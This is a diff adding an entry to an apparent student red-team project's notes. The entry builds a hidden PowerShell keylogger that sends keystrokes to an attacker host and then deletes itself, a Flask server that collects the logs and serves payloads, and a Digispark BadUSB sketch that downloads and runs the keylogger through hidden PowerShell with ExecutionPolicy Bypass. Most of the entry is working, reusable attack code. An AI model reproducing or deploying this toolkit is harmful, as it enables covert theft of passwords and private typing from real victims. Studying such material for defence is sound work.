@@ -1094,3 +1094,231 @@ And updated the file:
 [Demo video]()
 
 ---
+
+### 10.11.2023
+*Improving the keylogger script*   
+
+An idea we had in the meeting, when talking about either persistence or/and "covering the tracks", was that the keylogger script would be good to be deleted, when successfully done with the objectives it was meant to do.
+
+First it was pretty straightforward to add the file deletion to the script itself, after the "runs" where done:    
+![](notes_res/notes-%2028.png)
+
+This worked flawlessly, and also added there a line, to make sure, there is no keylog file left behind either, just in case some errors etc happens.
+
+Then...    
+As the script was design and meant to be used so, that it has a specified time for each run and specified amount of runs it will do, Sawulohi came up with the idea, that we should implement some sort of mechanic there to the script, that it would start to run, if there are no keypresses detected.    
+
+*In a nutshell, meaning that as is, it now could send 10 empty logs, and finish...*
+
+I tinkered around with the script and pretty much found out, that its only possible if im in the interactive console...   
+So i couldnt get it to work, when the script is running hidden in the background...   
+
+I spent hours in testing back and forth and came up with the idea:   
+- Always create an empty log file before each run
+- If the log file is still empty after the run is finished:
+	- Dont POST and "Dont count it as succesfull run"
+- Only count successful runs and compare them to the TimesToRun.
+
+This worked out Ok, and basically, it now stays running in the background, doing the loggings, but if no keypresses are recorded to the log file, it doesnt do any actions but begins from the start again, without increasing the "successful runs"
+
+Script:   
+```bash
+$TimesToRun = 2                         # How many successful runs to achieve.
+$RunTimeP = 0.5                         # Runtime in minutes for each run.
+$endpoint = "http://192.168.66.2/server"  # Address to send the file to.
+
+# Requires -Version 2
+function Start-Helper($Path = "$env:temp\help.txt") 
+{
+  $signatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+
+  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+  New-Item -Path $Path -ItemType File -Force
+
+  $successfulRuns = 0  # Counter for successful runs
+
+  try {
+    while ($successfulRuns -lt $TimesToRun) {
+      $TimeStart = Get-Date
+      $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
+
+      while ($TimeNow -le $TimeEnd) {
+        Start-Sleep -Milliseconds 40
+        $fileCreated = $false  # Flag to track if the file is created in this loop.
+
+        for ($ascii = 9; $ascii -le 254; $ascii++) {
+          $state = $API::GetAsyncKeyState($ascii)
+
+          if ($state -eq -32767) {
+            $null = [console]::CapsLock
+
+            $virtualKey = $API::MapVirtualKey($ascii, 3)
+
+            $kbstate = New-Object Byte[] 256
+            $checkkbstate = $API::GetKeyboardState($kbstate)
+
+            $mychar = New-Object -TypeName System.Text.StringBuilder
+
+            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+
+            if ($success) 
+            {
+              [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::UTF8) 
+              $fileCreated = $true  # File is created.
+            }
+          }
+        }
+
+        $TimeNow = Get-Date
+      }
+
+      # Check if the file is not null or whitespace before making the POST request
+      if ((Get-Content -Path $Path) -match '\S') {
+        Invoke-WebRequest -Uri $endpoint -Method POST -ContentType 'text/plain' -InFile $Path
+        Remove-Item -Path $Path -Force
+        $successfulRuns++
+      }
+
+      # Create an empty file for the next run.
+      New-Item -Path $Path -ItemType File -Force
+    }
+  }
+  finally
+  {
+    # Remove the script and log file after it finishes running.
+        Remove-Item -Path $env:temp\*.ps1 -Force
+        Remove-Item -Path $Path -Force
+    exit 1
+  }
+}
+
+Start-Helper
+
+```
+
+*One downside there is, for example, if the time per run is one hour, and if it detects a keypress in the 0:59 mark, it will log for one minute before making the POST request and completing the run.*
+
+***Another thing, based on my own perversions, and while writing the instruction files.***
+
+We had already the [webhook, to accept the POST requests](https://github.com/therealhalonen/PhishSticks/blob/b70c6265d9b277f79b5e4eb81b33b2e40d492d6b/scripts/webhook/README.md), to be used with our Keylogger.  And while writing the instructions/READMEs for [Digispark stuff](https://github.com/therealhalonen/PhishSticks/tree/master/digispark), i thought about the fact that our Digispark payloads, as we test and ran them, downloads the malwares: Keylogger script, Ransomware, from our Github.   
+Which is cool of course, but as if someone else wants to try them, they would need to get the scripts and stuff to their preferred location and edit them to according to their specs, they would need to host the files from somewhere, where the Digispark execution thing would download them from....    
+
+So i decided to give it a try, to modify the `webhook` to also accept GET requests.   
+The goal was:   
+Have the malware/payload available from the same location as where the keylogs will be sent to. So kind of like AllInOne script and only one device needed to do it all.   
+
+I also wanted it so, that there would be two endpoints.  One for POST and one for GET `/filename`    
+This was fairly easy peasy, as Flask is a simple thing.    
+With couple of tests, the final working, was:     
+```python
+# Handling GET requests to the '/server/<filename>' endpoint
+@app.route('/server/<filename>', methods=['GET'])
+def handle_webhook_get(filename):
+    try:
+        # Sending the specified file as an attachment in the response
+        return send_file(filename, as_attachment=True)
+    except FileNotFoundError:
+        # Returning a 404 status code if the file is not found
+        return "File not found", 404
+```
+
+Now if there were for example `test.file` in the folder, where the script is ran, it could be fetched with:   
+```bash
+wget http://address/server/test.file
+```
+
+Full script:
+```python
+#!/bin/python3
+from flask import Flask, request, send_file
+import os
+
+app = Flask(__name__)
+
+# Function to get the next available log number
+def get_next_log_number():
+    log_number = 1
+    while os.path.exists(f'log-{log_number}.txt'):
+        log_number += 1
+    return log_number
+
+# Handling POST requests to the '/server' endpoint
+@app.route('/server', methods=['POST'])
+def handle_webhook_post():
+    # Checking if the request method is POST
+    if request.method == 'POST':
+        # Getting the data from the request
+        data = request.data
+        # Getting the next available log number
+        log_number = get_next_log_number()
+        # Generating the log filename based on the log number
+        log_filename = f'log-{log_number}.txt'
+
+        # Writing the received data to the log file
+        with open(log_filename, 'w') as file:
+            file.write(data.decode("utf-8"))
+
+        # Returning a response indicating successful receipt and logging of data
+        return f"Webhook data received and logged as {log_filename}", 200
+    else:
+        # Returning a 501 status code for unsupported methods
+        return "Unsupported method", 501
+
+# Handling GET requests to the '/server/<filename>' endpoint
+@app.route('/server/<filename>', methods=['GET'])
+def handle_webhook_get(filename):
+    try:
+        # Sending the specified file as an attachment in the response
+        return send_file(filename, as_attachment=True)
+    except FileNotFoundError:
+        # Returning a 404 status code if the file is not found
+        return "File not found", 404
+
+# Running the Flask app if this script is executed directly
+if __name__ == '__main__':
+    # Configuring the Flask app to run on a specific host and port
+    app.run(host='192.168.66.2', port=80)
+```
+
+**Note:**   
+It is in no way, a fully working web service as there are no security stuff added, meaning no authentication and also no file browsing. So user needs to now what to GET.   
+
+But after a test drive with Digispark, it works as it was supposed to!   
+Edited the Digispark commands:   
+```bash
+#include <DigiKeyboardFi.h>
+
+void setup() {}
+
+void loop() {
+
+// Description: Keylogger 1.0
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+DigiKeyboardFi.print("powershell -w Hidden -c \"(New-Object System.Net.WebClient).DownloadFile(\'http://192.168.66.2/server/logger.ps1\', \\\"$env:Temp\\helper.ps1\\\"); powershell -ExecutionPolicy Bypass \\\"$env:Temp\\helper.ps1\\\"\"");
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(3000);
+exit(0);
+}
+```
+
+`192.168.66.2` is my attacker machine IP   
+
+![](notes_res/notes-%2029.png)   
+- One GET request received.   
+- Two POST requests received.   
+- Two logs recorded.   
+
+**Profit!**
